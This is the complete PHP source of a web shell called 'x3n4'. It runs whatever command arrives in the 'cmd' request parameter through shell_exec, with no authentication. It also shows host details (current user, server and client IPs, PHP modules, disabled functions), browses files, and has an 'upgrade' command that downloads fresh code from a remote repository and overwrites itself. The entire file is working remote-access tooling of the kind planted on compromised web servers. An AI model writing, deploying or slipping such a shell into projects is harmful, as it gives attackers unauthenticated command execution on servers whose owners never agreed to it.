<?php

define('X3N4_VERSION', 'v0.1.4-alpha');

session_start();

$X3N4_CONFIG = array(
    'shell_function' => 'shell_exec'
);

/**
 * Functions
 */
function get_shell_prefix()
{
    return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
}

function disabled_functions()
{
    static $disabled_fn;

    if ($disabled_fn === null) {
        $df = ini_get('disable_functions');
        $shfb = ini_get('suhosin.executor.func.blacklist');
        $fn_list = array_map('trim', explode(',', "$df,$shfb"));
        $disabled_fn = array_filter($fn_list, create_function('$value', 'return $value !== "";'));
    }

    return $disabled_fn;
}
function is_function_disabled($function)
{
    return in_array($function, disabled_functions());
}
function tree($dir)
{
    $ffs = scandir($dir);

    unset($ffs[array_search('.', $ffs, true)]);
    unset($ffs[array_search('..', $ffs, true)]);

    // prevent empty ordered elements
    if (count($ffs) < 1) {
        return;
    }

    echo '<ol>';
    foreach ($ffs as $ff) {
        echo '<li>', $ff;
        if (is_dir($dir.'/'.$ff)) {
            tree($dir.'/'.$ff);
        }
        echo '</li>';
    }
    echo '</ol>';
}
function list_folder_files($dir)
{
    $files = scandir($dir);
    $data = array();
    foreach ($files as $file) {
        array_push($data, array(
            'filename' => $file,
            'type' => is_dir($file) ? 'folder' : 'file',
            'fullpath' => realpath($file),
        ));
    }
    return $data;
}
function output_json($output = '')
{
    header('Content-Type: application/json;');
    echo json_encode(array(
        'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
        'banner' => get_shell_prefix(),
        'stdout' => $output
    ));
    session_write_close();
    exit(0);
}

/**
 * CORE
 */
if (!empty($_SESSION['pwd'])) {
    chdir($_SESSION['pwd']);
}

if (isset($_REQUEST['cmd'])) {
    $REQUESTED_CMD = trim($_REQUEST['cmd']);
    if (empty($REQUESTED_CMD)) {
        exit(0);
    }
    if ($REQUESTED_CMD == 'dirl') {
        output_json(list_folder_files('.'));
    }
    if ($REQUESTED_CMD == 'upgrade') {
        $options  = array('http' => array('user_agent' => 'custom user agent string'));
        $context  = stream_context_create($options);
        file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
        file_put_contents(__FILE__, file_get_contents('https://raw.githubusercontent.com/jorge-matricali/x3n4/master/x3n4.php', false, $context));
        output_json('--- PLEASE REFRESH YOUR BROWSER :D ---');
        exit(0);
    }
    if ($REQUESTED_CMD == 'exit') {
        session_destroy();
        exit(0);
    }
    if (substr($_REQUEST['cmd'], 0, 3) === 'cd ') {
        $dir = substr($_REQUEST['cmd'], 3);
        $dir = realpath($dir);
        if (chdir($dir)) {
            $_SESSION['pwd'] = $dir;
            output_json();
        }
    }

    $output = shell_exec($_REQUEST['cmd'] . ' 2>&1');
    output_json($output);
}

/**
 * HTML
 */
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>x3n4 <?php echo X3N4_VERSION; ?></title>

    <!-- Bootstrap -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    #stdout {
        max-height: 650px;
    }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="page-header">
            <span class="pull-right label label-<?php echo ini_get('safe_mode') ? 'success' : 'danger'; ?>">safe_mode <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?></span>
            x3n4 <?php echo X3N4_VERSION; ?>
        </h1>

        <ul class="nav nav-tabs" role="tablist">
            <li role="presentation"><a href="#information" aria-controls="information" role="tab" data-toggle="tab"><i class="fa fa-info-circle"></i> System information</a></li>
            <li role="presentation" class="active"><a href="#console" aria-controls="console" role="tab" data-toggle="tab"><i class="fa fa-terminal"></i> Console</a></li>
            <li role="presentation"><a href="#file-manager" aria-controls="file-manager" role="tab" data-toggle="tab"><i class="fa fa-file-code-o "></i> File manager</a></li>
        </ul>
        <p></p>
        <div class="tab-content">
            <div id="information" role="tabpanel" class="tab-pane table-responsive">
                <table class="table">
                    <tr>
                        <td>System:</td>
                        <td>
                            <?php
                            switch (PHP_OS) {
                                case 'Linux':
                                    $platform_icon = 'fa-linux';
                                    break;
                                case 'WINNT':
                                    $platform_icon = 'fa-windows';
                                    break;
                                case 'Darwin':
                                    $platform_icon = 'fa-osx';
                                    break;
                                default:
                                    $platform_icon = 'fa-unknown';
                            }
                            ?>
                            <i class="fa <?php echo $platform_icon; ?>"></i> <?php echo php_uname(); ?>
                        </td>
                    </tr>
                    <tr>
                        <td>Current user:</td>
                        <td><?php echo get_current_user(); ?></td>
                    </tr>
                    <tr>
                        <td>Server IP:</td>
                        <td><?php echo $_SERVER['SERVER_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>Client IP:</td>
                        <td><?php echo $_SERVER['REMOTE_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>PHP Version:</td>
                        <td><?php echo phpversion(); ?></td>
                    </tr>
                    <tr>
                        <td>Installed modules:</td>
                        <td><?php echo implode(', ', get_loaded_extensions()); ?></td>
                    </tr>
                    <tr>
                        <td>Disabled functions:</td>
                        <td><?php echo implode(', ', disabled_functions()); ?></td>
                    </tr>
                </table>
            </div>

            <div id="console" role="tabpanel" class="tab-pane active">
                <pre id="stdout"><?php echo shell_exec('cat /etc/motd') . PHP_EOL; ?></pre>
                <div class="form-group">
                    <div class="input-group">
                        <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
                        <input type="text" id="stdin" class="form-control" />
                        <span class="input-group-btn">
                            <button type="button" class="btn btn-default" id="btnExecCommand">Send</button>
                        </span>
                    </div>
                </div>
            </div>

            <div id="file-manager" role="tabpanel" class="tab-pane">
                <?php list_folder_files(__DIR__); ?>
            </div>
        </div>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script>
        function x3n4 () {
            this.version = '<?php echo X3N4_VERSION; ?>';
            this.execCommand = function(command) {
                if (command.trim() == 'clear') {
                    $('#stdout').html('');
                    return;
                }
                $.post('x3n4.php', {cmd: command}, function(data) {
                    $('#stdout').append(data.banner + " " + command + "\n");
                    if (data.stdout !== null) {
                        $('#stdout').append(data.stdout + "\n");
                    }
                    $('#pwd').html(data.banner);
                    $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                });
            }
            this.clickExecCommand = function() {
                window.x3n4.execCommand($('#stdin').val());
                $('#stdin').val('');
            }
            this.checkUpdate = function() {
                $.get('https://api.github.com/repos/jorge-matricali/x3n4/releases', function(data) {
                    if (window.x3n4.version !== data[0].tag_name) {
                        $('#stdout').append('/!\\ x3n4 ' + data[0].tag_name + " available. Type 'upgrade' to download the latest version automatically.\n");
                        $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                    }
                });
            }
            this.declareCallbacks = function() {
                $('#btnExecCommand').on('click', this.clickExecCommand);
                $('#stdin').on('keypress', function(ev) {
                    if ((ev.keyCode ? ev.keyCode : ev.which) == '13') {
                        $('#btnExecCommand').click()
                    }
                });
            }
        }
        window.x3n4 = new x3n4();
        window.x3n4.declareCallbacks();
        window.x3n4.checkUpdate();
    </script>
</body>
</html>
